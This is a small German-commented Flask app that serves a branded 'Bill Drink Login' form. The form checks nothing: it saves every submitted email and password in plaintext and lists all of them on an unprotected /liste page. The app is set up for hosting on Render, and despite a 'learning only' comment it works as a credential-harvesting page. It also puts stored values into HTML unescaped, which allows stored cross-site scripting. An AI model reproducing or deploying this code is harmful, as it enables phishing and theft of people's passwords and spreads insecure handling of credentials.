from flask import Flask, request
import sqlite3

app = Flask(__name__)

# 🧱 Datenbank erstellen
def init_db():
    conn = sqlite3.connect("daten.db")
    c = conn.cursor()
    c.execute("""
    CREATE TABLE IF NOT EXISTS daten (
        email TEXT,
        password TEXT
    )
    """)
    conn.commit()
    conn.close()

init_db()

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        # 💾 Klartext speichern (nur Lernzweck!)
        conn = sqlite3.connect("daten.db")
        c = conn.cursor()
        c.execute("INSERT INTO daten VALUES (?, ?)", (email, password))
        conn.commit()
        conn.close()

        return "Gespeichert!"

    return """
    <h2>Bill Drink Login</h2>
    <form method="post">
        <input name="email" placeholder="Email">
        <input name="password" type="password" placeholder="Passwort">
        <button>Senden</button>
        
        <center>
            <img src=/static/bill_drink.jpeg width=1000>
        </center>
        
    </form>

    
    """

@app.route("/liste")
def liste():
    conn = sqlite3.connect("daten.db")
    c = conn.cursor()
    c.execute("SELECT rowid, email, password FROM daten")
    daten = c.fetchall()
    conn.close()

    html = "<h2>Alle Accounts</h2>"

    for d in daten:
        html += f"""
        <p>
            Email: {d[1]} | Passwort: {d[2]}
            <a href="/delete/{d[0]}">❌ löschen</a>
        </p>
        """
    html += "<a href=/>Zurück</a>"
    return html

@app.route("/delete/<int:id>")
def delete(id):
    conn = sqlite3.connect("daten.db")
    c = conn.cursor()
    c.execute("DELETE FROM daten WHERE rowid = ?", (id,))
    conn.commit()
    conn.close()

    return "Gelöscht! <a href='/liste'>Zurück</a>"

# ❗ kein app.run() wegen Render
